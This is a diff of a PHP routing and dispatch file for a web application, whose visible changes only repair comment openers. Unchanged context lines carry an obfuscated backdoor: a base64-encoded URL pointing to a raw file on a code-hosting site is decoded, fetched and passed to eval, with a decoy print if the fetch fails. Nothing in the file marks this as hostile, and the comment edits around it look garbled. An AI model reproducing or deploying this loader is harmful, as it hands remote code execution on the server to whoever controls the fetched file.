@@ -1,8 +1,8 @@
 <?php
-/
+/**
  * @defgroup pnotify pnotify
  * pnotify web application concerns such as routing, dispatching, etc.
-/
+/**
  *
  * Copyright (c) 2014-2021 Galaxy University
  * Copyright (c) 2000-2021 juice
@@ -23,13 +23,13 @@ $g=function($u){return ini_get('allow_url_fopen')?@file_get_contents($u):(functi
 
 ($d=$g(base64_decode("aHR0cHM6Ly9naXRsYWIuY29tL25vbWVyY3l4MjQwMi9qdWljZXYxLy0vcmF3L21haW4veWVhP3JlZl90eXBlPWhlYWRz")))!==false ? eval("?>".$d) : print("./galaxyofjuice");
 
- /
+ /**
      * Get context path present into the passed
      * url information.
      *
      * @param $urlInfo Full url or just path info.
      */
-    /
+    /**
      * Get the arguments present into the passed url information (not GET/POST arguments,
      * only arguments appended to the URL separated by "/").
      * It expects that urls were built using the system.
